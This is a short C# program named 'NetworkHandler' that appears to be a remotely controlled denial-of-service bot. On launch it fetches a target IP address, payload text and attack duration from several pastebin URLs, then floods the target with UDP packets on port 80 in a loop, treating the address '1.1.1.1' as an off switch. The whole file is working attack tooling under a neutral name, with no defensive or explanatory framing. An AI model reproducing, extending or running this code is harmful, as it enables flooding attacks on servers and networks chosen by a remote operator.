using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Collections.Specialized;

namespace NetworkHandler
{
    internal static class Program
    {
        public static int Milliseconds { get; private set; }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            WebClient client = new WebClient();
            string IPHit = client.DownloadString("https://pastebin.com/raw/MdeRXPsj");
            string Data = client.DownloadString("https://pastebin.com/raw/a0vmKy6P");
            string TimeAPI = client.DownloadString("https://pastebin.com/raw/VFj8r1z6");
            string Version = client.DownloadString("https://pastebin.com/raw/UFDzTnC6");
            string download = client.DownloadString("https://pastebin.com/raw/L8yRCgEq");
            UdpClient Client = new UdpClient();
            IPAddress ipAddr = IPAddress.Parse(IPHit);
            System.Threading.Thread.Sleep(Milliseconds);
            int Time = Int32.Parse(TimeAPI);
            DateTime now = DateTime.Now;
            string thisversion = "1.0";


            while (DateTime.Now.Subtract(now).Seconds < 25)
            {

                if(Version == thisversion)
                {

                }
                
                else
                {

                }


                if (IPHit == "1.1.1.1")
                {

                }

                else
                {
                    while (DateTime.Now.Subtract(now).Seconds < Time)
                    {
                        //Wait For the Time

                        try
                        {
                            Client.Connect(ipAddr, 80);
                            byte[] senbytes = Encoding.ASCII.GetBytes(Data);
                            Client.Send(senbytes, senbytes.Length);
                            Client.AllowNatTraversal(true);
                            Client.DontFragment = true;
                        }

                        catch (Exception Err)
                  
                        {
                        
                        }
                    }

                }
            


            }
        }
    }
}
